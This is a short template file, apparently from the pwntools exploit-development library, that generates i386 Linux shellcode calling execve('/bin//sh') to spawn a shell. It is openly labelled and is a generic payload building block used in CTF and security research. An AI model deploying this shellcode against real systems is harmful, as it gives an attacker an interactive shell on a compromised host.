<% from pwnlib.shellcraft import i386 %>
<% from pwnlib.constants.linux.i386 import SYS_execve %>
<%docstring>Execute /bin/sh</%docstring>

    /* Set syscall number, clear edx */
${i386.mov('eax', SYS_execve)}
    cdq

    /*  Push '/bin//sh' */
    push edx
${i386.pushstr('/bin//sh', append_null = False)}

    /*  Call execve("/bin//sh", 0, 0) */
${i386.linux.syscall('eax', 'esp', 0, 'edx')}
